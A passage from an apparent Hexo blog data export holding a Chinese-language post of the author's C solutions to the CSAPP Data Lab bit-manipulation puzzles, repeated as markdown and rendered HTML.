= (y >> 4) & 0xF;\n  n3 = (y >> 8) & 0xF;\n  n = n+n2+n3+((y>>12) & 0xF);\n\n  return ((!(x>>31))&(n&1)&!(n>>1));\n}\n```\n\n## leastBitPos\n**leastBitPos - return a mask that marks the position of the least significant 1 bit. If x == 0, return 0**\n```c\nint leastBitPos(int x) {\n  return (~x+1) & x;\n}\n```\n\n## logicalShift\n**logicalShift - shift x to the right by n, using a logical shift**\n\n也没什么难度\n```c\nint logicalShift(int x, int n) {\n  unsigned int mask = (0xff)|(0xff<<8);\n  mask = mask | (mask<<16);\n  \n  return (x>>n)&(mask>>n);\n}\n```\n## satAdd \n**satAdd - adds two numbers but when positive overflow occurs, returns maximum possible value, and when negative overflow occurs, it returns minimum positive value.**\n\n我自认为第二难的一道题\n如果产生positive overflow，x+y\\<x\n如果产生negative overflow，x+y\\>x\n\n```c\nint satAdd(int x, int y) {\n  int out = x + y;\n  int mask1 = (~(x>>31))&(~(y>>31))&(out>>31); // if positive overflow, mask1 = -1, or = 0\n  int mask2 = (x>>31)&(y>>31)&(~(out>>31)); // if negative overflow, mask2 = -1, or = 0\n  int Min = 1<<31;\n  int Max = Min+(~1+1);\n  return ((~mask1)&(~mask2)&(x+y))|(mask1&Max)|(mask2&Min);\n}\n```\n\n## tc2sm\n**tc2sm - Convert from two's complement to sign-magnitude where the MSB is the sign bit**\n\n简单的\n```c\nint tc2sm(int x) {\n  int mask = x >> 31;\n  return (mask&(1<<31))|((x^mask)+(mask&1));\n}\n```","source":"_posts/DataLab 难点集锦.md","raw":"---\ntitle: CSAPP Data Lab 随记\ndate: 2020-10-28 16:57:11\ntags:\n- CSAPP\n- C Programming\ntop_img: false\ncover: /img/CSAPP.jpeg\n---\n## bang\n**bang - Compute !x without using !**\n\n分治\n\n```c\nint bang(int x) {\n  int y = x | (x>>16);\n\n  y = y | (y>>8);\n  y = y | (y>>4);\n  y = y | (y>>2);\n  y = y | (y>>1);\n\n  return 1^(1&y);\n}\n```\n## bitCount\n**bitCount - returns count of number of 1's in word**\n\n分治\n\n```c\nint bitCount(int x) {\n  int mask = 0x11|(0x11<<8)|(0x11<<16)|(0x11<<24);\n  int y = (x&mask)+((x>>1)&mask)+((x>>2)&mask)+((x>>3)&mask);\n  int n1,n2,n3;\n\n  y = y + (y>>16);\n  n1 = y & 0xF;\n  n2 = (y >> 4) & 0xF;\n  n3 = (y >> 8) & 0xF;\n\n  return n1+n2+n3+((y>>12) & 0xF);\n}\n```\n## copyLSB\n**copyLSB - set all bits of result to least significant bit of x**\n\n比较简单\n```c\nint copyLSB(int x) {\n  return (~(x&1)+1);\n}\n```\n## divpwr2 \n**divpwr2 - Compute x/(2^n), for 0 <= n <= 30**\n\n需要用一个偏置量bias，这题我是抄的，思路待补充。\n```c\nint divpwr2(int x, int n) {\n  int y = x>>31;\n  x += (y & ((1<<n)+~0));\n  return x >>n;\n}\n```\n## evenBits \n**evenBits - return word with all even-numbered bits set to 1**\n\n简单\n```c\nint evenBits(void) {\n  return 0x55|(0x55<<8)|(0x55<<16)|(0x55<<24);\n}\n```\n## fitsBits\n**fitsBits - return 1 if x can be represented as an n-bit, two's complement integer.**\n\n我感觉最难的题\n假如x可以被n位bit表示，且x大于等于0时，那么x>>(n-1)一定等于0\n如果x小于0，那么x>>(n-1)一定等于0xffffffff，即~(x>>(n-1))一定等于0\n```c\nint fitsBits(int x, int n) {\n  int y = x >> 31;\n  int z = n + (~1+1);\n  return ((!y)&!(x>>z))|((y+2)&!(~(x>>z)));\n}\n```\n\n## getByte\n**getByte - Extract byte n from word x**\n\n简单的\n```c\nint getByte(int x, int n) {\n  return (x>>(n<<3))&0xFF;\n}\n```\n\n## isGreater\n**isGreater - if x > y  then return 1, else return 0 **\n\n先剔除两个整数异号的情况，然后就好了\n\n```c\nint isGreater(int x, int y) {\n  int particular1 = (y>>31)&1&!(x>>31);\n  /*\n   * particular1 = 1 when x>0 and y<0\n   * particular1 = 0 otherwise\n   */\n  int particular2 = (x>>31)&1&!(y>>31);\n  /*\n   * particular2 = 1 when x<0 and y>0\n   * particular2 = 0 otherwise\n   */\n  /*\n   * if p1 = 1 return 1\n   * else if p2=1 return 0\n   * else return normal\n   */\n\n  return particular1|((!particular2)&((~x+1+y)>>31)&1);\n}\n```\n\n## isNonNegative\n**isNonNegative - return 1 if x >= 0, return 0 otherwise **\n\n```c\nint isNonNegative(int x) {\n  return !(x>>31);\n}\n```\n\n## isNotEqual\n**isNotEqual - return 0 if x == y, and 1 otherwise**\n\n```c\nint isNotEqual(int x, int y) {\n  return !!(x^y);\n}\n```\n\n## isPower2\n**isPower2 - returns 1 if x is a power of 2, and 0 otherwise**\n\n这道题不简单，但是思路已经忘记了，想起来再写。应该用了分组处理的办法\n\n```c\nint isPower2(int x) {\n  int mask = 0x11|(0x11<<8)|(0x11<<16)|(0x11<<24);\n  int y = (x&mask)+((x>>1)&mask)+((x>>2)&mask)+((x>>3)&mask);\n  int n,n2,n3;\n\n  y = y + (y>>16);\n  n = y & 0xF;\n  n2 = (y >> 4) & 0xF;\n  n3 = (y >> 8) & 0xF;\n  n = n+n2+n3+((y>>12) & 0xF);\n\n  return ((!(x>>31))&(n&1)&!(n>>1));\n}\n```\n\n## leastBitPos\n**leastBitPos - return a mask that marks the position of the least significant 1 bit. If x == 0, return 0**\n```c\nint leastBitPos(int x) {\n  return (~x+1) & x;\n}\n```\n\n## logicalShift\n**logicalShift - shift x to the right by n, using a logical shift**\n\n也没什么难度\n```c\nint logicalShift(int x, int n) {\n  unsigned int mask = (0xff)|(0xff<<8);\n  mask = mask | (mask<<16);\n  \n  return (x>>n)&(mask>>n);\n}\n```\n## satAdd \n**satAdd - adds two numbers but when positive overflow occurs, returns maximum possible value, and when negative overflow occurs, it returns minimum positive value.**\n\n我自认为第二难的一道题\n如果产生positive overflow，x+y\\<x\n如果产生negative overflow，x+y\\>x\n\n```c\nint satAdd(int x, int y) {\n  int out = x + y;\n  int mask1 = (~(x>>31))&(~(y>>31))&(out>>31); // if positive overflow, mask1 = -1, or = 0\n  int mask2 = (x>>31)&(y>>31)&(~(out>>31)); // if negative overflow, mask2 = -1, or = 0\n  int Min = 1<<31;\n  int Max = Min+(~1+1);\n  return ((~mask1)&(~mask2)&(x+y))|(mask1&Max)|(mask2&Min);\n}\n```\n\n## tc2sm\n**tc2sm - Convert from two's complement to sign-magnitude where the MSB is the sign bit**\n\n简单的\n```c\nint tc2sm(int x) {\n  int mask = x >> 31;\n  return (mask&(1<<31))|((x^mask)+(mask&1));\n}\n```","slug":"DataLab 难点集锦","published":1,"updated":"2020-11-05T02:48:30.050Z","_id":"ckiszi5a3000598wadnmc6fgt","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"bang\"><a class=\"markdownIt-Anchor\" href=\"#bang\"></a> bang</h2>\n<p><strong>bang - Compute !x without using !</strong></p>\n<p>分治</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bang</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = x | (x&gt;&gt;<span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">8</span>);</span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">4</span>);</span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">2</span>);</span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>^(<span class=\"number\">1</span>&amp;y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"bitcount\"><a class=\"markdownIt-Anchor\" href=\"#bitcount\"></a> bitCount</h2>\n<p><strong>bitCount - returns count of number of 1’s in word</strong></p>\n<p>分治</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitCount</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask = <span class=\"number\">0x11</span>|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">8</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">16</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">24</span>);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = (x&amp;mask)+((x&gt;&gt;<span class=\"number\">1</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">2</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">3</span>)&amp;mask);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> n1,n2,n3;</span><br><span class=\"line\"></span><br><span class=\"line\">  y = y + (y&gt;&gt;<span class=\"number\">16</span>);</span><br><span class=\"line\">  n1 = y &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n2 = (y &gt;&gt; <span class=\"number\">4</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n3 = (y &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> n1+n2+n3+((y&gt;&gt;<span class=\"number\">12</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"copylsb\"><a class=\"markdownIt-Anchor\" href=\"#copylsb\"></a> copyLSB</h2>\n<p><strong>copyLSB - set all bits of result to least significant bit of x</strong></p>\n<p>比较简单</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">copyLSB</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (~(x&amp;<span class=\"number\">1</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"divpwr2\"><a class=\"markdownIt-Anchor\" href=\"#divpwr2\"></a> divpwr2</h2>\n<p><strong>divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</strong></p>\n<p>需要用一个偏置量bias，这题我是抄的，思路待补充。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">divpwr2</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = x&gt;&gt;<span class=\"number\">31</span>;</span><br><span class=\"line\">  x += (y &amp; ((<span class=\"number\">1</span>&lt;&lt;n)+~<span class=\"number\">0</span>));</span><br><span class=\"line\">  <span class=\"keyword\">return</span> x &gt;&gt;n;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"evenbits\"><a class=\"markdownIt-Anchor\" href=\"#evenbits\"></a> evenBits</h2>\n<p><strong>evenBits - return word with all even-numbered bits set to 1</strong></p>\n<p>简单</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">evenBits</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0x55</span>|(<span class=\"number\">0x55</span>&lt;&lt;<span class=\"number\">8</span>)|(<span class=\"number\">0x55</span>&lt;&lt;<span class=\"number\">16</span>)|(<span class=\"number\">0x55</span>&lt;&lt;<span class=\"number\">24</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"fitsbits\"><a class=\"markdownIt-Anchor\" href=\"#fitsbits\"></a> fitsBits</h2>\n<p><strong>fitsBits - return 1 if x can be represented as an n-bit, two’s complement integer.</strong></p>\n<p>我感觉最难的题<br />\n假如x可以被n位bit表示，且x大于等于0时，那么x&gt;&gt;(n-1)一定等于0<br />\n如果x小于0，那么x&gt;&gt;(n-1)一定等于0xffffffff，即~(x&gt;&gt;(n-1))一定等于0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fitsBits</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = x &gt;&gt; <span class=\"number\">31</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> z = n + (~<span class=\"number\">1</span>+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((!y)&amp;!(x&gt;&gt;z))|((y+<span class=\"number\">2</span>)&amp;!(~(x&gt;&gt;z)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"getbyte\"><a class=\"markdownIt-Anchor\" href=\"#getbyte\"></a> getByte</h2>\n<p><strong>getByte - Extract byte n from word x</strong></p>\n<p>简单的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getByte</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (x&gt;&gt;(n&lt;&lt;<span class=\"number\">3</span>))&amp;<span class=\"number\">0xFF</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"isgreater\"><a class=\"markdownIt-Anchor\" href=\"#isgreater\"></a> isGreater</h2>\n<p>**isGreater - if x &gt; y  then return 1, else return 0 **</p>\n<p>先剔除两个整数异号的情况，然后就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isGreater</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> particular1 = (y&gt;&gt;<span class=\"number\">31</span>)&amp;<span class=\"number\">1</span>&amp;!(x&gt;&gt;<span class=\"number\">31</span>);</span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   * particular1 = 1 when x&gt;0 and y&lt;0</span></span><br><span class=\"line\"><span class=\"comment\">   * particular1 = 0 otherwise</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> particular2 = (x&gt;&gt;<span class=\"number\">31</span>)&amp;<span class=\"number\">1</span>&amp;!(y&gt;&gt;<span class=\"number\">31</span>);</span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   * particular2 = 1 when x&lt;0 and y&gt;0</span></span><br><span class=\"line\"><span class=\"comment\">   * particular2 = 0 otherwise</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">   * if p1 = 1 return 1</span></span><br><span class=\"line\"><span class=\"comment\">   * else if p2=1 return 0</span></span><br><span class=\"line\"><span class=\"comment\">   * else return normal</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> particular1|((!particular2)&amp;((~x+<span class=\"number\">1</span>+y)&gt;&gt;<span class=\"number\">31</span>)&amp;<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"isnonnegative\"><a class=\"markdownIt-Anchor\" href=\"#isnonnegative\"></a> isNonNegative</h2>\n<p>**isNonNegative - return 1 if x &gt;= 0, return 0 otherwise **</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isNonNegative</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !(x&gt;&gt;<span class=\"number\">31</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"isnotequal\"><a class=\"markdownIt-Anchor\" href=\"#isnotequal\"></a> isNotEqual</h2>\n<p><strong>isNotEqual - return 0 if x == y, and 1 otherwise</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isNotEqual</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> !!(x^y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"ispower2\"><a class=\"markdownIt-Anchor\" href=\"#ispower2\"></a> isPower2</h2>\n<p><strong>isPower2 - returns 1 if x is a power of 2, and 0 otherwise</strong></p>\n<p>这道题不简单，但是思路已经忘记了，想起来再写。应该用了分组处理的办法</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isPower2</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask = <span class=\"number\">0x11</span>|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">8</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">16</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">24</span>);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = (x&amp;mask)+((x&gt;&gt;<span class=\"number\">1</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">2</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">3</span>)&amp;mask);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> n,n2,n3;</span><br><span class=\"line\"></span><br><span class=\"line\">  y = y + (y&gt;&gt;<span class=\"number\">16</span>);</span><br><span class=\"line\">  n = y &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n2 = (y &gt;&gt; <span class=\"number\">4</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n3 = (y &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xF</span>;</span><br><span class=\"line\">  n = n+n2+n3+((y&gt;&gt;<span class=\"number\">12</span>) &amp; <span class=\"number\">0xF</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((!(x&gt;&gt;<span class=\"number\">31</span>))&amp;(n&amp;<span class=\"number\">1</span>)&amp;!(n&gt;&gt;<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"leastbitpos\"><a class=\"markdownIt-Anchor\" href=\"#leastbitpos\"></a> leastBitPos</h2>\n<p><strong>leastBitPos - return a mask that marks the position of the least significant 1 bit. If x == 0, return 0</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">leastBitPos</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (~x+<span class=\"number\">1</span>) &amp; x;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"logicalshift\"><a class=\"markdownIt-Anchor\" href=\"#logicalshift\"></a> logicalShift</h2>\n<p><strong>logicalShift - shift x to the right by n, using a logical shift</strong></p>\n<p>也没什么难度</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">logicalShift</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> mask = (<span class=\"number\">0xff</span>)|(<span class=\"number\">0xff</span>&lt;&lt;<span class=\"number\">8</span>);</span><br><span class=\"line\">  mask = mask | (mask&lt;&lt;<span class=\"number\">16</span>);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">return</span> (x&gt;&gt;n)&amp;(mask&gt;&gt;n);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"satadd\"><a class=\"markdownIt-Anchor\" href=\"#satadd\"></a> satAdd</h2>\n<p><strong>satAdd - adds two numbers but when positive overflow occurs, returns maximum possible value, and when negative overflow occurs, it returns minimum positive value.</strong></p>\n<p>我自认为第二难的一道题<br />\n如果产生positive overflow，x+y&lt;x<br />\n如果产生negative overflow，x+y&gt;x</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">satAdd</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> out = x + y;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask1 = (~(x&gt;&gt;<span class=\"number\">31</span>))&amp;(~(y&gt;&gt;<span class=\"number\">31</span>))&amp;(out&gt;&gt;<span class=\"number\">31</span>); <span class=\"comment\">// if positive overflow, mask1 = -1, or = 0</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask2 = (x&gt;&gt;<span class=\"number\">31</span>)&amp;(y&gt;&gt;<span class=\"number\">31</span>)&amp;(~(out&gt;&gt;<span class=\"number\">31</span>)); <span class=\"comment\">// if negative overflow, mask2 = -1, or = 0</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> Min = <span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> Max = Min+(~<span class=\"number\">1</span>+<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> ((~mask1)&amp;(~mask2)&amp;(x+y))|(mask1&amp;Max)|(mask2&amp;Min);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"tc2sm\"><a class=\"markdownIt-Anchor\" href=\"#tc2sm\"></a> tc2sm</h2>\n<p><strong>tc2sm - Convert from two’s complement to sign-magnitude where the MSB is the sign bit</strong></p>\n<p>简单的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">tc2sm</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask = x &gt;&gt; <span class=\"number\">31</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (mask&amp;(<span class=\"number\">1</span>&lt;&lt;<span class=\"number\">31</span>))|((x^mask)+(mask&amp;<span class=\"number\">1</span>));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"bang\"><a class=\"markdownIt-Anchor\" href=\"#bang\"></a> bang</h2>\n<p><strong>bang - Compute !x without using !</strong></p>\n<p>分治</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bang</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = x | (x&gt;&gt;<span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">8</span>);</span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">4</span>);</span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">2</span>);</span><br><span class=\"line\">  y = y | (y&gt;&gt;<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>^(<span class=\"number\">1</span>&amp;y);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"bitcount\"><a class=\"markdownIt-Anchor\" href=\"#bitcount\"></a> bitCount</h2>\n<p><strong>bitCount - returns count of number of 1’s in word</strong></p>\n<p>分治</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">bitCount</span><span class=\"params\">(<span class=\"keyword\">int</span> x)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask = <span class=\"number\">0x11</span>|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">8</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">16</span>)|(<span class=\"number\">0x11</span>&lt;&lt;<span class=\"number\">24</span>);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> y = (x&amp;mask)+((x&gt;&gt;<span class=\"number\">1</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">2</span>)&amp;mask)+((x&gt;&gt;<span class=\"number\">3</span>)&amp;mask);</span><br><span class=\"line\">  <span class=\"keyword\">int</span> 